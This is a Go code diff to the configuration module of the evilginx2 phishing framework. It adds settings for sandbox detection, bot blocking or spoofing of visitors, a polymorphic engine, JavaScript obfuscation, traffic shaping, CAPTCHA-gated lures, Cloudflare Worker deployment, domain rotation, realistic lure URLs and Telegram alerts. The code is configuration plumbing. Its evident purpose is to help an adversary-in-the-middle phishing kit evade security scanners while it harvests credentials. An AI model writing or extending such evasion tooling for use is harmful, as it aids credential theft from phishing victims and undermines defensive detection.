@@ -8,6 +8,9 @@ import (
 	"strings"
 
 	"github.com/kgretzky/evilginx2/log"
+	"github.com/kgretzky/evilginx2/core/antibot/infra"
+	"github.com/kgretzky/evilginx2/core/antibot/response"
+	"github.com/kgretzky/evilginx2/core/antibot/signals"
 
 	"github.com/spf13/viper"
 )
@@ -21,6 +24,7 @@ type Lure struct {
 	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
 	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
 	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
+	PostRedirector  string `mapstructure:"post_redirector" json:"post_redirector" yaml:"post_redirector"`
 	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
 	Info            string `mapstructure:"info" json:"info" yaml:"info"`
 	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
@@ -56,48 +60,110 @@ type BlacklistConfig struct {
 	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
 }
 
+type WhitelistConfig struct {
+	Enabled bool `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+}
+
 type CertificatesConfig struct {
 }
 
 type GoPhishConfig struct {
-	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
-	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
-	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
+	AdminUrl               string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
+	ApiKey                 string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
+	InsecureTLS            bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
+	IntegratedAdminUrl     string `mapstructure:"integrated_admin_url" json:"integrated_admin_url" yaml:"integrated_admin_url"`
 }
 
-type TelegramCfg struct {
-	BotToken string   `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
-	ChatIDs  []int64  `mapstructure:"chat_ids" json:"chat_ids" yaml:"chat_ids"`
-	Enabled bool     `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+type TelegramConfig struct {
+	BotToken string `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
+	ChatID   string `mapstructure:"chat_id" json:"chat_id" yaml:"chat_id"`
+	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+}
+
+type DNSProviderConfig struct {
+	Provider        string `mapstructure:"provider" json:"provider" yaml:"provider"`
+	ApiKey          string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
+	Email           string `mapstructure:"email" json:"email" yaml:"email"`
+	Enabled         bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	WildcardEnabled bool   `mapstructure:"wildcard_enabled" json:"wildcard_enabled" yaml:"wildcard_enabled"`
+}
+
+type AntibotConfig struct {
+	Enabled     bool     `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	OverrideIPs []string `mapstructure:"override_ips" json:"override_ips" yaml:"override_ips"`
+	Action      string   `mapstructure:"action" json:"action" yaml:"action"` // "block", "spoof"
+	SpoofUrl    string   `mapstructure:"spoof_url" json:"spoof_url" yaml:"spoof_url"`
+	MLThreshold float64  `mapstructure:"ml_threshold" json:"ml_threshold" yaml:"ml_threshold"`
+}
+
+type JSObfuscationConfig struct {
+	Enabled bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	Level   string `mapstructure:"level" json:"level" yaml:"level"`
+}
+
+type MLDetectorConfig struct {
+	Enabled         bool    `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	Threshold       float64 `mapstructure:"threshold" json:"threshold" yaml:"threshold"`
+	CollectBehavior bool    `mapstructure:"collect_behavior" json:"collect_behavior" yaml:"collect_behavior"`
+	LogPredictions  bool    `mapstructure:"log_predictions" json:"log_predictions" yaml:"log_predictions"`
+}
+
+type CloudflareConfig struct {
+	AccountID       string `mapstructure:"account_id" json:"account_id" yaml:"account_id"`
+	APIToken        string `mapstructure:"api_token" json:"api_token" yaml:"api_token"`
+	ZoneID          string `mapstructure:"zone_id" json:"zone_id" yaml:"zone_id"`
+	WorkerSubdomain string `mapstructure:"worker_subdomain" json:"worker_subdomain" yaml:"worker_subdomain"`
+	Enabled         bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+}
+
+type LureGenerationConfig struct {
+	Strategy string `mapstructure:"strategy" json:"strategy" yaml:"strategy"` // short, medium, long, realistic, hex, base64, mixed
 }
 
 type GeneralConfig struct {
-	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	OldIpv4          string       `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4     string       `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4         string       `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl        string       `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpPort         int          `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
+	HttpsPort        int          `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort          int          `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert         bool         `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	TrustedProxies   []string     `mapstructure:"trusted_proxies" json:"trusted_proxies" yaml:"trusted_proxies"`
+	ServerCookieName string       `mapstructure:"server_cookie_name" json:"server_cookie_name" yaml:"server_cookie_name"`
+	WebAdminPort     int          `mapstructure:"web_admin_port" json:"web_admin_port" yaml:"web_admin_port"`
 }
 
 type Config struct {
-	general          *GeneralConfig
-	certificates    *CertificatesConfig
-	blacklistConfig *BlacklistConfig
-	gophishConfig   *GoPhishConfig
-	telegramConfig  *TelegramCfg
-	proxyConfig     *ProxyConfig
-	phishletConfig  map[string]*PhishletConfig
-	phishlets       map[string]*Phishlet
-	phishletNames   []string
-	activeHostnames []string
-	redirectorsDir  string
-	lures           []*Lure
-	lureIds         []string
-	subphishlets    []*SubPhishlet
-	cfg             *viper.Viper
+	general           *GeneralConfig
+	certificates      *CertificatesConfig
+	blacklistConfig   *BlacklistConfig
+	whitelistConfig   *WhitelistConfig
+	gophishConfig     *GoPhishConfig
+	telegramConfig    *TelegramConfig
+	proxyConfig       *ProxyConfig
+	dnsProviderConfig *DNSProviderConfig
+	antibotConfig     *AntibotConfig
+
+	jsObfuscationConfig    *JSObfuscationConfig
+	mlDetectorConfig       *MLDetectorConfig
+	captchaConfig          *response.CaptchaConfig
+	domainManager          *DomainManager
+	trafficShapingConfig   *signals.TrafficShapingConfig
+	sandboxDetectionConfig *signals.SandboxDetectionConfig
+	polymorphicConfig      *infra.PolymorphicConfig
+	cloudflareWorkerConfig *CloudflareConfig
+	lureGenerationConfig   *LureGenerationConfig
+	phishletConfig         map[string]*PhishletConfig
+	phishlets              map[string]*Phishlet
+	phishletNames          []string
+	activeHostnames        []string
+	redirectorsDir         string
+	postRedirectorsDir     string
+	lures                  []*Lure
+	lureIds                []string
+	subphishlets           []*SubPhishlet
+	cfg                    *viper.Viper
 }
 
 const (
@@ -107,23 +173,52 @@ const (
 	CFG_PROXY        = "proxy"
 	CFG_PHISHLETS    = "phishlets"
 	CFG_BLACKLIST    = "blacklist"
+	CFG_WHITELIST    = "whitelist"
 	CFG_SUBPHISHLETS = "subphishlets"
 	CFG_GOPHISH      = "gophish"
+	CFG_TELEGRAM     = "telegram"
+	CFG_DNS_PROVIDER = "dns_provider"
+	CFG_ANTIBOT      = "antibot"
+
+	CFG_JS_OBFUSCATION    = "js_obfuscation"
+	CFG_ML_DETECTOR       = "ml_detector"
+	CFG_CAPTCHA           = "captcha"
+	CFG_TRAFFIC_SHAPING   = "traffic_shaping"
+	CFG_SANDBOX_DETECTION = "sandbox_detection"
+	CFG_POLYMORPHIC       = "polymorphic_engine"
+	CFG_CLOUDFLARE_WORKER = "cloudflare_worker"
+	CFG_LURE_GENERATION   = "lure_generation"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
 
+func (c *Config) Save() error {
+	return c.cfg.WriteConfig()
+}
+
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
-		general:          &GeneralConfig{},
-		certificates:     &CertificatesConfig{},
-		gophishConfig:    &GoPhishConfig{},
-		telegramConfig:   &TelegramCfg{},
-		phishletConfig:  make(map[string]*PhishletConfig),
-		phishlets:        make(map[string]*Phishlet),
-		phishletNames:   []string{},
-		lures:           []*Lure{},
-		blacklistConfig: &BlacklistConfig{},
+		general:           &GeneralConfig{},
+		certificates:      &CertificatesConfig{},
+		gophishConfig:     &GoPhishConfig{},
+		telegramConfig:    &TelegramConfig{},
+		dnsProviderConfig: &DNSProviderConfig{},
+		antibotConfig:     &AntibotConfig{Enabled: true, Action: "block", MLThreshold: 0.85},
+
+		jsObfuscationConfig:    &JSObfuscationConfig{},
+		mlDetectorConfig:       &MLDetectorConfig{Enabled: false, Threshold: 0.85, CollectBehavior: true, LogPredictions: true},
+		captchaConfig:          &response.CaptchaConfig{Enabled: false, Provider: "", RequireForLures: false, Providers: make(map[string]response.ProviderConfig)},
+		trafficShapingConfig:   &signals.TrafficShapingConfig{Enabled: false, Mode: "adaptive", GlobalRateLimit: 1000, GlobalBurstSize: 2000, PerIPRateLimit: 60, PerIPBurstSize: 120, CleanupInterval: 30},
+		sandboxDetectionConfig: &signals.SandboxDetectionConfig{Enabled: false, Mode: "passive", ServerSideChecks: true, ClientSideChecks: true, CacheResults: true, CacheDuration: 30, DetectionThreshold: 0.6, ActionOnDetection: "block"},
+		polymorphicConfig:      &infra.PolymorphicConfig{Enabled: false, MutationLevel: "medium", CacheEnabled: true, CacheDuration: 30, SeedRotation: 60, TemplateMode: false, PreserveSemantics: true},
+		cloudflareWorkerConfig: &CloudflareConfig{},
+		lureGenerationConfig:   &LureGenerationConfig{Strategy: "realistic"},
+		phishletConfig:         make(map[string]*PhishletConfig),
+		phishlets:              make(map[string]*Phishlet),
+		phishletNames:          []string{},
+		lures:                  []*Lure{},
+		blacklistConfig:        &BlacklistConfig{},
+		whitelistConfig:        &WhitelistConfig{},
 	}
 
 	c.cfg = viper.New()
@@ -159,7 +254,29 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
 
+	c.cfg.UnmarshalKey(CFG_WHITELIST, &c.whitelistConfig)
+
 	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
+
+	c.cfg.UnmarshalKey(CFG_TELEGRAM, &c.telegramConfig)
+
+	c.cfg.UnmarshalKey(CFG_DNS_PROVIDER, &c.dnsProviderConfig)
+
+	c.cfg.UnmarshalKey(CFG_ANTIBOT, &c.antibotConfig)
+
+	c.cfg.UnmarshalKey(CFG_JS_OBFUSCATION, &c.jsObfuscationConfig)
+
+	c.cfg.UnmarshalKey(CFG_ML_DETECTOR, &c.mlDetectorConfig)
+
+	c.cfg.UnmarshalKey(CFG_CAPTCHA, &c.captchaConfig)
+
+	c.cfg.UnmarshalKey(CFG_TRAFFIC_SHAPING, &c.trafficShapingConfig)
+
+	c.cfg.UnmarshalKey(CFG_SANDBOX_DETECTION, &c.sandboxDetectionConfig)
+
+	c.cfg.UnmarshalKey(CFG_POLYMORPHIC, &c.polymorphicConfig)
+
+	c.cfg.UnmarshalKey(CFG_CLOUDFLARE_WORKER, &c.cloudflareWorkerConfig)
 
 	if c.general.OldIpv4 != "" {
 		if c.general.ExternalIpv4 == "" {
@@ -174,6 +291,9 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 
 	if c.general.UnauthUrl == "" && created_cfg {
 		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
+	}
+	if c.general.HttpPort == 0 {
+		c.SetHttpPort(80)
 	}
 	if c.general.HttpsPort == 0 {
 		c.SetHttpsPort(443)
@@ -191,6 +311,10 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
 	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
+
+	// Initialize unified DomainManager
+	c.domainManager = NewDomainManager(c.cfg)
+
 
 	for i := 0; i < len(c.lures); i++ {
 		c.lureIds = append(c.lureIds, GenRandomToken())
@@ -221,8 +345,8 @@ func (c *Config) SavePhishlets() {
 }
 
 func (c *Config) SetSiteHostname(site string, hostname string) bool {
-	if c.general.Domain == "" {
-		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
+	if c.domainManager.GetPrimaryDomain() == "" {
+		log.Error("you need to set server top-level domain, first. type: domains add <your-domain.com>")
 		return false
 	}
 	pl, err := c.GetPhishlet(site)
@@ -234,8 +358,11 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 		log.Error("phishlet is a template - can't set hostname")
 		return false
 	}
-	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
-		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
+
+	// Validate hostname against DomainManager
+	if hostname != "" && !c.domainManager.IsDomainValid(hostname) {
+		domains := c.domainManager.GetActiveDomains()
+		log.Error("phishlet hostname must end with one of the configured domains: %v", domains)
 		return false
 	}
 	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
@@ -268,10 +395,41 @@ func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
 }
 
 func (c *Config) SetBaseDomain(domain string) {
-	c.general.Domain = domain
-	c.cfg.Set(CFG_GENERAL, c.general)
-	log.Info("server domain set to: %s", domain)
-	c.cfg.WriteConfig()
+	// Add domain and set primary via DomainManager
+	c.domainManager.AddDomain(domain, "", "", "", true)
+}
+
+func (c *Config) AddDomain(domain string, description string) error {
+	return c.domainManager.AddDomain(domain, "", "", description, false)
+}
+
+// RemoveDomain removes a domain from the configuration
+func (c *Config) RemoveDomain(domain string) error {
+	return c.domainManager.RemoveDomain(domain)
+}
+
+// SetPrimaryDomain sets the primary domain
+func (c *Config) SetPrimaryDomain(domain string) error {
+	return c.domainManager.SetPrimary(domain)
+}
+
+func (c *Config) EnableDomain(domain string, enabled bool) error {
+	if enabled {
+		return c.domainManager.SetStatus(domain, DomainActive)
+	}
+	return c.domainManager.SetStatus(domain, DomainInactive)
+}
+
+func (c *Config) GetDomainManager() *DomainManager {
+	return c.domainManager
+}
+
+func (c *Config) GetPrimaryDomain() string {
+	return c.domainManager.GetPrimaryDomain()
+}
+
+func (c *Config) IsDomainValid(domain string) bool {
+	return c.domainManager.IsDomainValid(domain)
 }
 
 func (c *Config) SetServerIP(ip_addr string) {
@@ -307,6 +465,13 @@ func (c *Config) SetDnsPort(port int) {
 	c.general.DnsPort = port
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("dns port set to: %d", port)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetHttpPort(port int) {
+	c.general.HttpPort = port
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("http port set to: %d", port)
 	c.cfg.WriteConfig()
 }
 
@@ -388,6 +553,72 @@ func (c *Config) SetGoPhishInsecureTLS(k bool) {
 	c.cfg.WriteConfig()
 }
 
+func (c *Config) SetTelegramBotToken(token string) {
+	c.telegramConfig.BotToken = token
+	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
+	log.Info("telegram bot token set")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTelegramChatID(chatID string) {
+	c.telegramConfig.ChatID = chatID
+	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
+	log.Info("telegram chat id set to: %s", chatID)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTelegramEnabled(enabled bool) {
+	c.telegramConfig.Enabled = enabled
+	c.cfg.Set(CFG_TELEGRAM, c.telegramConfig)
+	log.Info("telegram notifications enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetCloudflareWorkerConfig() CloudflareConfig {
+	return *c.cloudflareWorkerConfig
+}
+
+func (c *Config) SetCloudflareWorkerAccountID(accountID string) {
+	c.cloudflareWorkerConfig.AccountID = accountID
+	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
+	log.Info("cloudflare worker account id set")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetCloudflareWorkerAPIToken(apiToken string) {
+	c.cloudflareWorkerConfig.APIToken = apiToken
+	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
+	log.Info("cloudflare worker api token set")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetCloudflareWorkerZoneID(zoneID string) {
+	c.cloudflareWorkerConfig.ZoneID = zoneID
+	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
+	log.Info("cloudflare worker zone id set to: %s", zoneID)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetCloudflareWorkerSubdomain(subdomain string) {
+	c.cloudflareWorkerConfig.WorkerSubdomain = subdomain
+	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
+	log.Info("cloudflare worker subdomain set to: %s", subdomain)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetCloudflareWorkerEnabled(enabled bool) {
+	c.cloudflareWorkerConfig.Enabled = enabled
+	c.cfg.Set(CFG_CLOUDFLARE_WORKER, c.cloudflareWorkerConfig)
+	log.Info("cloudflare worker deployment enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) IsCloudflareWorkerEnabled() bool {
+	return c.cloudflareWorkerConfig.Enabled &&
+		c.cloudflareWorkerConfig.AccountID != "" &&
+		c.cloudflareWorkerConfig.APIToken != ""
+}
+
 func (c *Config) IsLureHostnameValid(hostname string) bool {
 	for _, l := range c.lures {
 		if l.Hostname == hostname {
@@ -454,6 +685,10 @@ func (c *Config) SetRedirectorsDir(path string) {
 	c.redirectorsDir = path
 }
 
+func (c *Config) SetPostRedirectorsDir(path string) {
+	c.postRedirectorsDir = path
+}
+
 func (c *Config) ResetAllSites() {
 	c.phishletConfig = make(map[string]*PhishletConfig)
 	c.SavePhishlets()
@@ -486,6 +721,10 @@ func (c *Config) SetBlacklistMode(mode string) {
 	log.Info("blacklist mode set to: %s", mode)
 }
 
+func (c *Config) GetUnauthUrl() string {
+	return c.general.UnauthUrl
+}
+
 func (c *Config) SetUnauthUrl(_url string) {
 	c.general.UnauthUrl = _url
 	c.cfg.Set(CFG_GENERAL, c.general)
@@ -512,7 +751,8 @@ func (c *Config) refreshActiveHostnames() {
 		if err != nil {
 			continue
 		}
-		for _, host := range pl.GetPhishHosts(false) {
+		hosts := pl.GetPhishHosts(false)
+		for _, host := range hosts {
 			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
 		}
 	}
@@ -746,6 +986,14 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	}
 }
 
+func (c *Config) GetLureCount() int {
+	return len(c.lures)
+}
+
+func (c *Config) GetLures() []*Lure {
+	return c.lures
+}
+
 func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
 	for _, l := range c.lures {
 		if l.Phishlet == site {
@@ -789,7 +1037,7 @@ func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
 }
 
 func (c *Config) GetBaseDomain() string {
-	return c.general.Domain
+	return c.domainManager.GetPrimaryDomain()
 }
 
 func (c *Config) GetServerExternalIP() string {
@@ -808,12 +1056,43 @@ func (c *Config) GetDnsPort() int {
 	return c.general.DnsPort
 }
 
+func (c *Config) GetHttpPort() int {
+	return c.general.HttpPort
+}
+
 func (c *Config) GetRedirectorsDir() string {
 	return c.redirectorsDir
 }
 
+func (c *Config) GetPostRedirectorsDir() string {
+	return c.postRedirectorsDir
+}
+
+func (c *Config) GetWebAdminPort() int {
+	return c.general.WebAdminPort
+}
+
+func (c *Config) SetWebAdminPort(port int) {
+	c.general.WebAdminPort = port
+}
+
 func (c *Config) GetBlacklistMode() string {
 	return c.blacklistConfig.Mode
+}
+
+func (c *Config) SetWhitelistEnabled(enabled bool) {
+	c.whitelistConfig.Enabled = enabled
+	c.cfg.Set(CFG_WHITELIST, c.whitelistConfig)
+	c.cfg.WriteConfig()
+	if enabled {
+		log.Info("whitelist: enabled")
+	} else {
+		log.Info("whitelist: disabled")
+	}
+}
+
+func (c *Config) IsWhitelistEnabled() bool {
+	return c.whitelistConfig.Enabled
 }
 
 func (c *Config) IsAutocertEnabled() bool {
@@ -832,35 +1111,380 @@ func (c *Config) GetGoPhishInsecureTLS() bool {
 	return c.gophishConfig.InsecureTLS
 }
 
-func (c *Config) SetTelegramBotToken(k string) {
-	c.telegramConfig.BotToken = k
-	c.cfg.Set("telegram", c.telegramConfig)
-	log.Info("telegram bot token set")
-	c.cfg.WriteConfig()
+func (c *Config) GetGoPhishIntegratedAdminUrl() string {
+	return c.gophishConfig.IntegratedAdminUrl
 }
 
-func (c *Config) SetTelegramChatIDs(chatIDs []int64) {
-	c.telegramConfig.ChatIDs = chatIDs
-	c.cfg.Set("telegram", c.telegramConfig)
-	log.Info("telegram chat ids set to: %v", chatIDs)
-	c.cfg.WriteConfig()
-}
-
-func (c *Config) SetTelegramEnabled(enabled bool) {
-	c.telegramConfig.Enabled = enabled
-	c.cfg.Set("telegram", c.telegramConfig)
-	log.Info("telegram enabled set to: %v", enabled)
-	c.cfg.WriteConfig()
+func (c *Config) SetGoPhishIntegratedAdminUrl(url string) {
+	c.gophishConfig.IntegratedAdminUrl = url
 }
 
 func (c *Config) GetTelegramBotToken() string {
 	return c.telegramConfig.BotToken
 }
 
-func (c *Config) GetTelegramChatIDs() []int64 {
-	return c.telegramConfig.ChatIDs
+func (c *Config) GetTelegramChatID() string {
+	return c.telegramConfig.ChatID
 }
 
 func (c *Config) GetTelegramEnabled() bool {
 	return c.telegramConfig.Enabled
+}
+
+func (c *Config) GetTelegramConfig() *TelegramConfig {
+	return c.telegramConfig
+}
+
+func (c *Config) GetDNSProviderConfig() *DNSProviderConfig {
+	return c.dnsProviderConfig
+}
+
+func (c *Config) IsWildcardEnabled() bool {
+	return c.dnsProviderConfig != nil && c.dnsProviderConfig.WildcardEnabled
+}
+
+func (c *Config) SetDNSProvider(provider string, apiKey string, email string, enabled bool, wildcardEnabled bool) {
+	c.dnsProviderConfig.Provider = provider
+	c.dnsProviderConfig.ApiKey = apiKey
+	c.dnsProviderConfig.Email = email
+	c.dnsProviderConfig.Enabled = enabled
+	c.dnsProviderConfig.WildcardEnabled = wildcardEnabled
+	c.cfg.Set(CFG_DNS_PROVIDER, c.dnsProviderConfig)
+	log.Info("dns provider configuration updated")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetDefaultDNSProvider() string {
+	if c.dnsProviderConfig != nil && c.dnsProviderConfig.Enabled {
+		return c.dnsProviderConfig.Provider
+	}
+	return ""
+}
+
+func (c *Config) GetTrustedProxies() []string {
+	return c.general.TrustedProxies
+}
+
+func (c *Config) GetAntibotConfig() *AntibotConfig {
+	return c.antibotConfig
+}
+
+func (c *Config) GetJSObfuscationConfig() *JSObfuscationConfig {
+	return c.jsObfuscationConfig
+}
+
+func (c *Config) SetJSObfuscation(enabled bool, level string) {
+	c.jsObfuscationConfig.Enabled = enabled
+	c.jsObfuscationConfig.Level = level
+	c.cfg.Set(CFG_JS_OBFUSCATION, c.jsObfuscationConfig)
+	log.Info("js obfuscation configuration updated")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetMLDetectorConfig() *MLDetectorConfig {
+	return c.mlDetectorConfig
+}
+
+func (c *Config) SetMLDetector(enabled bool, threshold float64, collectBehavior bool, logPredictions bool) {
+	c.mlDetectorConfig.Enabled = enabled
+	c.mlDetectorConfig.Threshold = threshold
+	c.mlDetectorConfig.CollectBehavior = collectBehavior
+	c.mlDetectorConfig.LogPredictions = logPredictions
+	c.cfg.Set(CFG_ML_DETECTOR, c.mlDetectorConfig)
+	log.Info("ml detector configuration updated")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) IsMLDetectorEnabled() bool {
+	return c.mlDetectorConfig != nil && c.mlDetectorConfig.Enabled
+}
+
+func (c *Config) GetCaptchaConfig() *response.CaptchaConfig {
+	return c.captchaConfig
+}
+
+func (c *Config) SetCaptchaEnabled(enabled bool) {
+	c.captchaConfig.Enabled = enabled
+	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
+	log.Info("captcha enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetCaptchaProvider(provider string) error {
+	if c.captchaConfig.Providers == nil {
+		c.captchaConfig.Providers = make(map[string]response.ProviderConfig)
+	}
+
+	// Check if provider config exists
+	if _, exists := c.captchaConfig.Providers[provider]; !exists {
+		return fmt.Errorf("provider %s not configured", provider)
+	}
+
+	c.captchaConfig.Provider = provider
+	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
+	log.Info("captcha provider set to: %s", provider)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+func (c *Config) SetCaptchaProviderConfig(provider string, siteKey string, secretKey string, options map[string]string) {
+	if c.captchaConfig.Providers == nil {
+		c.captchaConfig.Providers = make(map[string]response.ProviderConfig)
+	}
+
+	c.captchaConfig.Providers[provider] = response.ProviderConfig{
+		SiteKey:   siteKey,
+		SecretKey: secretKey,
+		Options:   options,
+	}
+
+	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
+	log.Info("captcha provider %s configured", provider)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetCaptchaRequireForLures(require bool) {
+	c.captchaConfig.RequireForLures = require
+	c.cfg.Set(CFG_CAPTCHA, c.captchaConfig)
+	log.Info("captcha require for lures: %v", require)
+	c.cfg.WriteConfig()
+}
+
+// Domain rotation methods now delegate to DomainManager - see terminal.go
+
+
+func (c *Config) GetTrafficShapingConfig() *signals.TrafficShapingConfig {
+	return c.trafficShapingConfig
+}
+
+func (c *Config) SetTrafficShapingEnabled(enabled bool) {
+	c.trafficShapingConfig.Enabled = enabled
+	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
+	log.Info("traffic shaping enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTrafficShapingMode(mode string) {
+	c.trafficShapingConfig.Mode = mode
+	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
+	log.Info("traffic shaping mode set to: %s", mode)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTrafficShapingGlobalLimit(rateLimit int, burstSize int) {
+	c.trafficShapingConfig.GlobalRateLimit = rateLimit
+	c.trafficShapingConfig.GlobalBurstSize = burstSize
+	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
+	log.Info("global rate limit set to: %d/s (burst: %d)", rateLimit, burstSize)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTrafficShapingPerIPLimit(rateLimit int, burstSize int) {
+	c.trafficShapingConfig.PerIPRateLimit = rateLimit
+	c.trafficShapingConfig.PerIPBurstSize = burstSize
+	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
+	log.Info("per-IP rate limit set to: %d/s (burst: %d)", rateLimit, burstSize)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTrafficShapingBandwidthLimit(limit int64) {
+	c.trafficShapingConfig.BandwidthLimit = limit
+	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
+	log.Info("bandwidth limit set to: %d bytes/s", limit)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetTrafficShapingGeoRule(country string, rateLimit int, burstSize int, priority int, blocked bool) {
+	if c.trafficShapingConfig.GeoRules == nil {
+		c.trafficShapingConfig.GeoRules = make(map[string]*signals.GeoRuleConfig)
+	}
+
+	c.trafficShapingConfig.GeoRules[country] = &signals.GeoRuleConfig{
+		RateLimit: rateLimit,
+		BurstSize: burstSize,
+		Priority:  priority,
+		Blocked:   blocked,
+	}
+
+	c.cfg.Set(CFG_TRAFFIC_SHAPING, c.trafficShapingConfig)
+	log.Info("traffic shaping rule for %s configured", country)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetSandboxDetectionConfig() *signals.SandboxDetectionConfig {
+	return c.sandboxDetectionConfig
+}
+
+func (c *Config) SetSandboxDetectionEnabled(enabled bool) {
+	c.sandboxDetectionConfig.Enabled = enabled
+	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
+	log.Info("sandbox detection enabled: %v", enabled)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSandboxDetectionMode(mode string) {
+	c.sandboxDetectionConfig.Mode = mode
+	c.cfg.Set(CFG_SANDBOX_DETECTION, c.sandboxDetectionConfig)
+	log.Info("sandbox detection mode set to: %s", mode)
+	c.cfg.WriteConfig()
+}
+
